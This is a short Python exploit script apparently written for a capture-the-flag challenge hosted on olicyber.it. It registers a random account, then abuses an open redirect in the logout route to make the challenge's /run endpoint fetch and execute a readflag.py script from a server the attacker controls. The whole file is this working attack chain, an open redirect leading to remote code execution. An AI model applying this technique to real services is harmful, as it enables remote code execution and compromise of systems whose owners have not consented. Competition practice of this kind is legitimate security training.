import random
import string
from requests.sessions import Session

def gen(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

s = Session()

URL = "http://cloud_free_tier.challs.olicyber.it"

#a web server controlled by u, serving readflag.py
SERVER = ""
if not SERVER:
    print("add ur web server :p")
    exit()
else:
    SERVER += "/readflag.py"

OP_REDIRECT_URL = "/logout?redirect=" + SERVER
RUN_URL = URL + "/run"

username = gen(8)
passwd = gen(8)

r_reg = s.post(
    URL + "/register", 
    data={"username": username, "password": passwd, "repeat_password": passwd}, 
    allow_redirects=True
)

if not s.cookies:
    s.post(
        URL + "/login",
        data={"username": username, "password": passwd}
    )

r_run = s.post(RUN_URL, data={"file": OP_REDIRECT_URL})
